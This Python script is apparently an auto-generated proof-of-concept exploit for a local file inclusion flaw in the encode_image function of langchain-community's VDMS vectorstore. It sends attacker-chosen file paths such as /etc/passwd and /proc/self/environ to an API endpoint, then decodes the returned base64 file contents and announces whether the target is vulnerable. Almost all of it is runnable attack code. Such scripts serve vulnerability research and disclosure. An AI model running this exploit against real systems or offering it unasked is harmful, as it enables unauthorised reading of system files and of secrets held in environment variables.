#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-007
# Sink: encode_image
# Auto-generated — run with: python3 lfi_supply_like_encode_image_4.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Local File Inclusion (LFI) in langchain-community-only

Vulnerability: The `encode_image` function in VDMS vectorstore directly opens
a file path provided by the caller without any validation. The `add_images`
method passes user-controlled `uris` (list of paths) directly to `encode_image`.

Impact: An attacker can read arbitrary files from the server's filesystem by
supplying paths like '../../etc/passwd' or absolute paths.

This PoC demonstrates the vulnerability by reading /etc/passwd (or a benign
file if /etc/passwd is not available) through the vulnerable API endpoint.
"""

import requests
import sys
import os
import base64
import json

# Configuration - modify these as needed
TARGET_URL = "http://localhost:8000"  # Default target URL
ENDPOINT = "/api/v1/trigger"  # The simulated endpoint that calls add_images
TIMEOUT = 10  # Request timeout in seconds

# Benign test file - change to something that exists on the target
# Using /etc/passwd as it's a standard Unix file, but we'll also try a safe alternative
TEST_FILES = [
    "/etc/passwd",  # Standard Unix password file
    "/etc/hostname",  # Hostname file (usually readable)
    "/proc/self/environ",  # Environment variables (may be restricted)
    "/tmp/test.txt",  # A safe test file if it exists
]


def exploit_lfi(target_url, file_path):
    """
    Attempt to read a file via the LFI vulnerability.
    
    Args:
        target_url: Base URL of the target server
        file_path: Path to the file to read (can use ../ traversal)
    
    Returns:
        The decoded content if successful, None otherwise
    """
    # The vulnerable function expects a list of URIs (paths)
    # We send a single path as a list
    payload = {
        "uris": [file_path]  # Attacker-controlled path
    }
    
    full_url = f"{target_url}{ENDPOINT}"
    
    try:
        print(f"[*] Attempting to read: {file_path}")
        print(f"[*] Sending POST to: {full_url}")
        print(f"[*] Payload: {json.dumps(payload, indent=2)}")
        
        response = requests.post(
            full_url,
            json=payload,
            timeout=TIMEOUT,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"[*] Response status: {response.status_code}")
        
        if response.status_code == 200:
            # The response should contain base64-encoded file content
            # The vulnerable function returns base64-encoded data
            try:
                result = response.json()
                print(f"[*] Response data: {json.dumps(result, indent=2)[:500]}...")
                
                # The response might contain the base64-encoded content
                # Look for base64 strings in the response
                if isinstance(result, dict):
                    for key, value in result.items():
                        if isinstance(value, str) and len(value) > 50:
                            try:
                                decoded = base64.b64decode(value).decode('utf-8', errors='replace')
                                print(f"[+] Successfully decoded content from key '{key}':")
                                print(decoded[:1000])  # Print first 1000 chars
                                return decoded
                            except:
                                pass
                    # If no base64 found, print raw response
                    print(f"[*] Raw response: {response.text[:1000]}")
                    return response.text
                else:
                    print(f"[*] Raw response: {response.text[:1000]}")
                    return response.text
                    
            except json.JSONDecodeError:
                print(f"[*] Non-JSON response: {response.text[:500]}")
                return response.text
        else:
            print(f"[-] Request failed with status {response.status_code}")
            print(f"[-] Response: {response.text[:500]}")
            return None
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {full_url}")
        print("[-] Make sure the target server is running and accessible")
        return None
    except requests.exceptions.Timeout:
        print(f"[-] Request timed out after {TIMEOUT} seconds")
        return None
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return None


def main():
    """Main function to run the exploit."""
    print("=" * 60)
    print("LFI Exploit PoC for langchain-community-only")
    print("=" * 60)
    print()
    
    # Allow command-line override of target URL
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = TARGET_URL
    
    print(f"[*] Target URL: {target_url}")
    print(f"[*] Endpoint: {ENDPOINT}")
    print()
    
    # Try multiple test files
    for test_file in TEST_FILES:
        print("-" * 40)
        result = exploit_lfi(target_url, test_file)
        if result:
            print(f"[+] Successfully read {test_file}")
            print()
            # If we got /etc/passwd content, we've confirmed the vulnerability
            if "root:" in result or "nobody:" in result:
                print("[!] CONFIRMED: LFI vulnerability exists!")
                print("[!] The server is vulnerable to arbitrary file read")
                break
        else:
            print(f"[-] Failed to read {test_file}")
        print()
    
    print("=" * 60)
    print("Exploit demonstration complete")
    print("=" * 60)


if __name__ == "__main__":
    main()
